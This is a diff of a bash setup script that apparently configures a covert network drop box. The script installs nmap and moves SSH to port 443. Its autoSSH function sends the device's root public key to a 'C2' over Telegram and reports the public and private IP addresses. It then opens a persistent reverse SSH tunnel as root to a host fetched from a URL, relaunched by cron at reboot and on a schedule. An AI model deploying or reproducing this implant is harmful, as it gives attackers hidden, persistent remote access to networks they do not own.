@@ -60,6 +60,13 @@ function initialSetup {
     chmod +x /bin/telegram.sh
 }
 
+function tools {
+    echo -e "${yellowColor}[*] Installing Nmap...${resetColor}"
+    if ! dpkg -l nmap >/dev/null 2>&1; then
+        apt-get install nmap -y
+    fi
+}
+
 function SSHServer {
     echo -e "${yellowColor}[*] Installing and configuring OpenSSH Server...${resetColor}"
     if ! dpkg -l openssh-server >/dev/null 2>&1; then
@@ -72,6 +79,38 @@ function SSHServer {
         sed -i 's/#Port 22/Port 443/g' /etc/ssh/sshd_config
     fi
     systemctl enable ssh
+}
+
+function autoSSH {
+	echo -e "${yellowColor}[*] Setting up automatic reverse SSH tunnel...${resetColor}"
+	if ! dpkg -l autossh >/dev/null 2>&1; then
+        apt-get install autossh -y
+    fi
+
+	echo -e "${yellowColor}[*] Generating SSH key pair...${resetColor}"
+	ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa <<<y 2>&1 >/dev/null
+
+	echo -e "${yellowColor}[*] Sending via Telegram the /root/.ssh/authorized_keys file that has to go in C2...${resetColor}"
+	/bin/telegram.sh "$(cat /root/.ssh/id_rsa.pub)"
+
+	echo -e "${yellowColor}[*] Creating script /bin/autossh-connect.sh...${resetColor}"
+	read -p "[*] Enter URL with SSH connection data (Format: IP:PORT): " urlssh
+	read -p "Continue? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
+	echo '#!/bin/bash' >/bin/autossh-connect.sh
+	echo 'output="$(curl -s '"$urlssh"')"' >>/bin/autossh-connect.sh
+	echo 'host="$(echo $output | cut -d: -f1)"' >>/bin/autossh-connect.sh
+	echo 'port="$(echo $output | cut -d: -f2)"' >>/bin/autossh-connect.sh
+	echo '/bin/telegram.sh "$(echo Public IP: $(curl -s ifconfig.co))"' >>/bin/autossh-connect.sh
+	echo '/bin/telegram.sh "$(echo Private IP: $(hostname -I))"' >>/bin/autossh-connect.sh
+	echo 'autossh -M 11166 -i /root/.ssh/id_rsa -R 1337:localhost:443 root@$"$host" -p "$port"' >>/bin/autossh-connect.sh
+	chmod +x /bin/autossh-connect.sh
+
+	echo -e "${yellowColor}[*] Creating cronjob for autossh...${resetColor}"
+	crontab -l > mycron
+	echo "@reboot sleep 5 && /bin/autossh-connect.sh > /dev/null 2>&1" >> mycron
+	echo "/5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1" >> mycron
+	crontab mycron
+	rm mycron
 }
 
 function routedAP {
@@ -131,44 +170,6 @@ function routedAP {
 	echo "rsn_pairwise=CCMP" >> /etc/hostapd/hostapd.conf
 }
 
-function autoSSH {
-	echo -e "${yellowColor}[*] Setting up automatic reverse SSH tunnel...${resetColor}"
-	if ! dpkg -l autossh >/dev/null 2>&1; then
-        apt-get install autossh -y
-    fi
-
-	echo -e "${yellowColor}[*] Generating SSH key pair...${resetColor}"
-	ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa <<<y 2>&1 >/dev/null
-
-	echo -e "${yellowColor}[*] Sending via Telegram the /root/.ssh/authorized_keys file that has to go in C2...${resetColor}"
-	/bin/telegram.sh "$(cat /root/.ssh/id_rsa.pub)"
-
-	echo -e "${yellowColor}[*] Creating script /bin/autossh-connect.sh...${resetColor}"
-	read -p "[*] Enter URL with SSH connection data (Format: IP:PORT): " urlssh
-	read -p "Continue? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
-	echo '#!/bin/bash' >/bin/autossh-connect.sh
-	echo 'output="$(curl -s '"$urlssh"')"' >>/bin/autossh-connect.sh
-	echo 'host="$(echo $output | cut -d: -f1)"' >>/bin/autossh-connect.sh
-	echo 'port="$(echo $output | cut -d: -f2)"' >>/bin/autossh-connect.sh
-	echo '/bin/telegram.sh "$(echo Public IP: $(curl -s ifconfig.co))"' >>/bin/autossh-connect.sh
-	echo '/bin/telegram.sh "$(echo Private IP: $(hostname -I))"' >>/bin/autossh-connect.sh
-	echo 'autossh -M 11166 -i /root/.ssh/id_rsa -R 1337:localhost:443 root@$"$host" -p "$port"' >>/bin/autossh-connect.sh
-	chmod +x /bin/autossh-connect.sh
-
-	echo -e "${yellowColor}[*] Creating cronjob for autossh...${resetColor}"
-	crontab -l > mycron
-	echo "@reboot sleep 5 && /bin/autossh-connect.sh > /dev/null 2>&1" >> mycron
-	echo "/5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1" >> mycron
-	crontab mycron
-	rm mycron
-}
-
-function tools {
-    if ! dpkg -l nmap >/dev/null 2>&1; then
-        apt-get install nmap -y
-    fi
-}
-
 function reboot {
 	read -p "Reboot? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
 	shutdown -r now
@@ -178,8 +179,8 @@ isRoot
 pingTest
 printBanner
 initialSetup
-SSHServer
-routedAP
-autoSSH
 tools
+SSHServer
+autoSSH
+routedAP
 reboot
